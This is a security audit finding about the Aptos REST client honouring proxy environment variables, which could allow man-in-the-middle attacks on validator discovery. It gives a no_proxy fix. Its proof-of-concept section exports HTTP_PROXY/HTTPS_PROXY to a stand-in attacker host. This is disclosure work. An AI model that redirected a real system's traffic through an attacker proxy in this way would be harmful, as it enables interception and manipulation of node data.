# Audit Report

## Title
Aptos REST Client Allows Uncontrolled Proxy Configuration via Environment Variables

## Summary
The `aptos-rest-client` library creates HTTP clients that automatically honor system proxy environment variables (HTTP_PROXY, HTTPS_PROXY) without explicitly disabling this behavior. This allows an attacker with environment variable control to route REST API traffic through malicious proxies, potentially enabling man-in-the-middle attacks on validator discovery and blockchain state queries.

## Finding Description

The `ClientBuilder::build()` function in `aptos-rest-client` constructs a reqwest HTTP client without disabling proxy support. [1](#0-0) 

By default, the reqwest library automatically respects proxy configuration from environment variables (HTTP_PROXY, HTTPS_PROXY, ALL_PROXY, NO_PROXY). [2](#0-1) 

This client is used in critical network infrastructure, specifically in `RestStream` for validator discovery when genesis is far behind: [3](#0-2) 

The `RestStream` fetches the `ValidatorSet` resource from the blockchain via REST API to discover peer information: [4](#0-3) 

Notably, other parts of the codebase explicitly disable proxy support when creating HTTP clients, demonstrating awareness of this security concern: [5](#0-4) 

An attacker who can control environment variables in the deployment environment could set HTTP_PROXY/HTTPS_PROXY to route REST client traffic through their infrastructure, enabling:
1. **Validator Discovery Manipulation**: MITM attacks on ValidatorSet queries used for peer discovery
2. **Blockchain State Manipulation**: Serving stale or incorrect blockchain state data
3. **Denial of Service**: Blocking or delaying REST API responses
4. **Information Disclosure**: Intercepting sensitive API queries

## Impact Explanation

This vulnerability falls into **Medium Severity** per the Aptos bug bounty criteria. While it enables significant protocol manipulation through MITM attacks on validator discovery, it requires environment variable control which typically implies some level of system access. The impact includes:

- **State inconsistencies**: Nodes could receive manipulated validator sets affecting peer connectivity
- **Network partitioning**: Selective blocking of REST API calls could isolate nodes
- **Information leakage**: REST API queries could be intercepted

This does not directly enable loss of funds or consensus safety violations, but represents a significant protocol security concern that requires intervention to remediate.

## Likelihood Explanation

The likelihood is **Medium** but depends heavily on deployment context:

**Higher likelihood scenarios:**
- Containerized deployments (Kubernetes, Docker) where environment variables can be injected through configuration
- Compromised CI/CD pipelines that modify deployment configurations  
- Multi-tenant environments with insufficient isolation
- Supply chain attacks where dependencies manipulate environment variables

**Lower likelihood scenarios:**
- Properly secured bare-metal deployments with strict environment variable control
- Deployments where validator operators maintain tight security controls

The precedent set by `BackupServiceClient` explicitly disabling proxies indicates this is a recognized security concern within the codebase.

## Recommendation

Add explicit `.no_proxy()` call to the reqwest client builder to disable automatic proxy configuration:

```rust
pub fn build(self) -> Client {
    let version_path_base = get_version_path_with_base(self.base_url.clone());

    Client {
        inner: self
            .reqwest_builder
            .default_headers(self.headers)
            .timeout(self.timeout)
            .cookie_store(true)
            .no_proxy()  // Add this line
            .build()
            .unwrap(),
        base_url: self.base_url,
        version_path_base,
    }
}
```

If proxy support is required for specific use cases, implement explicit proxy configuration methods on `ClientBuilder` that allow controlled proxy usage rather than implicit environment variable-based configuration.

## Proof of Concept

```bash
#!/bin/bash
# Set malicious proxy environment variables
export HTTP_PROXY="http://attacker.com:8080"
export HTTPS_PROXY="http://attacker.com:8080"

# Run any Aptos component that uses aptos-rest-client
# All REST API traffic will now route through attacker.com:8080
cargo run --bin aptos-node -- # or any component using the REST client

# The attacker's proxy at attacker.com:8080 can now:
# 1. Intercept all REST API queries
# 2. Manipulate responses (validator sets, blockchain state)
# 3. Cause DoS by blocking requests
# 4. Log sensitive information from API calls
```

To verify the vulnerability exists, add logging to observe proxy usage:
```rust
// In client_builder.rs build() method, before .build()
.reqwest_builder
    .connection_verbose(true)  // This will show proxy usage in logs
    .build()
```

Then run with the environment variables set and observe that traffic routes through the proxy.

### Citations

**File:** crates/aptos-rest-client/src/client_builder.rs (L95-109)
```rust
    pub fn build(self) -> Client {
        let version_path_base = get_version_path_with_base(self.base_url.clone());

        Client {
            inner: self
                .reqwest_builder
                .default_headers(self.headers)
                .timeout(self.timeout)
                .cookie_store(true)
                .build()
                .unwrap(),
            base_url: self.base_url,
            version_path_base,
        }
    }
```

**File:** Cargo.toml (L761-767)
```text
reqwest = { version = "0.11.11", features = [
    "blocking",
    "cookies",
    "json",
    "multipart",
    "stream",
] }
```

**File:** network/discovery/src/rest.rs (L24-36)
```rust
impl RestStream {
    pub(crate) fn new(
        network_context: NetworkContext,
        rest_url: url::Url,
        interval_duration: Duration,
        time_service: TimeService,
    ) -> Self {
        RestStream {
            network_context,
            rest_client: aptos_rest_client::Client::new(rest_url),
            interval: Box::pin(time_service.interval(interval_duration)),
        }
    }
```

**File:** network/discovery/src/rest.rs (L42-52)
```rust
    fn poll_next(mut self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<Option<Self::Item>> {
        // Wait for delay, or add the delay for next call
        futures::ready!(self.interval.as_mut().poll_next(cx));

        // Retrieve the onchain resource at the interval
        // TODO there should be a better way than converting this to a blocking call
        let response = block_on(self.rest_client.get_account_resource_bcs::<ValidatorSet>(
            AccountAddress::ONE,
            "0x1::stake::ValidatorSet",
        ));
        Poll::Ready(match response {
```

**File:** storage/backup/backup-cli/src/utils/backup_service_client.rs (L45-52)
```rust
    pub fn new(address: String) -> Self {
        Self {
            address,
            client: reqwest::Client::builder()
                .no_proxy()
                .build()
                .expect("Http client should build."),
        }
```
